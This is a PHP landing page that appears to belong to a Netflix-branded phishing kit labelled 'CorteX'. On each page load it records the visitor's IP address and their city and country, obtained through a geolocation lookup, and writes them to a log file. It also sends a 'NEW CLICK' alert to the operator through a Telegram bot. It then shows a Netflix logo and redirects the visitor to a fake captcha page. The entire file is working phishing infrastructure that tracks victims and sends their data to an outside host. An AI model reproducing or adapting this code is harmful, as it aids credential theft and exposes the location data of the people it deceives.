<?php
session_start();

include_once "./cortex/zebi/functions.php";
include_once "./cortex/zebi/config.php";

$_SESSION['allow'] = "yes";

function get_visitor_info(&$ip, &$country, &$city, &$visit_time) {
    $ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP);
    $ipapi_url = "http://ip-api.com/json/{$ip}?fields=status,country,city";

    $curl = curl_init($ipapi_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);

    if ($response === false) {
        $country = "Unknown";
        $city = "Unknown";
    } else {
        $data = json_decode($response, true);
        $country = (isset($data['status']) && $data['status'] == 'success') ? htmlspecialchars($data['country'], ENT_QUOTES, 'UTF-8') : 'Unknown';
        $city = (isset($data['status']) && $data['status'] == 'success') ? htmlspecialchars($data['city'], ENT_QUOTES, 'UTF-8') : 'Unknown';
    }

    $visit_time = date("Y-m-d H:i:s");

    return sprintf("IP: %s | Country: %s | City: %s | Time: %s\n", $ip, $country, $city, $visit_time);
}

$log_file = "visit_log.txt";

try {
    $file_handle = fopen($log_file, 'a');
    if (!$file_handle) {
        throw new Exception("Failed to open $log_file for writing.");
    }

    $visitor_info = get_visitor_info($ip, $country, $city, $visit_time);

    if (fwrite($file_handle, $visitor_info) === false) {
        throw new Exception("Failed to write to $log_file.");
    }

    fclose($file_handle);

    $message = "
+ 1 NEW CLICK DE $country

🧩 Extra
├ 🖥️ PAYS : $country
└ 🌐 IP : $ip 

📍 Base : NETFLIX [$visit_time]
└ [© 2025 - All rights reserved.]

[🎰] CorteX - @Sssba3 [🎰]
";



    $message_encoded = urlencode($message);

    $telegramUrl = $config['telegram']['api_url'] . TOKEN . "/sendMessage?chat_id=" . CHATID . "&text=" . $message_encoded;

    file_get_contents($telegramUrl);



} catch (Exception $e) {
    error_log($e->getMessage());
    echo "An error occurred. Please try again later.";
    exit();
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Chargement...</title>
    <link rel="icon" href="cortex/files/img/nficon2025.ico">
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      background: black;
      overflow: hidden;
    }

    #transition-overlay {
      position: fixed;
      z-index: 9999;
      background: black;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 1;
      transition: opacity 1s ease-in-out;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    #transition-overlay.fade-out {
      opacity: 0;
    }

    #logo {
      width: 200px;
    }
  </style>
</head>
<body>
  <div id="transition-overlay">
    <img id="logo" src="cortex/files/img/logo.png" alt="Netflix Logo" />
  </div>

  <script>
    window.addEventListener('load', () => {
      const overlay = document.getElementById('transition-overlay');
      overlay.classList.add('fade-out');

      setTimeout(() => {
        window.location.href = "cortex/captcha.php";
      }, 4000); 
    });
  </script>
</body>
</html>
